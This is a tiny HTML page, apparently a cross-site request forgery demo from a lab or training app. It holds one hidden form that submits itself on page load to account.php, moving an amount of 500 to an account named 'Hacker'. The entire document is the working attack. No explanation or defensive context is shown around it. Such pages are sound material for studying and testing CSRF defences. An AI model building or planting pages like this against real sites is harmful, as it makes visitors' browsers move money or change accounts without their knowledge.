<html>
<head>
	<title></title>
</head>
<body onload="document.getElementById('f1').submit()">
	
	<form action="account.php" method="GET" id="f1">
      <input type="hidden" name="amount" value="500">
      <input type="hidden" name="to" value="Hacker">
      <input type="submit">
      </form>
	<br>
<a href="Start.php">Back</a>
</body>
</html>
